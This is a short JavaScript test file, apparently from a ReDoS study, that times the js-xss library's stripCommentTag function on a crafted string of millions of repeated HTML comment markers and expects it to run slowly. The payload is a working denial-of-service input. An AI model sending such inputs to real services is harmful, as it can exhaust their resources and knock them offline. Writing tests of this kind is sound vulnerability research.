//https://github.com/leizongmin/js-xss/pull/239
test("ReDos in natural", () => {
  const measureTime = require("../utils").measureTime;
  const a = require("xss");

  let payload = " <!-- ".repeat(9000000) + " CISPA " + " --> ".repeat(9000000);

  let t = measureTime(function () {
    a.stripCommentTag(payload);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
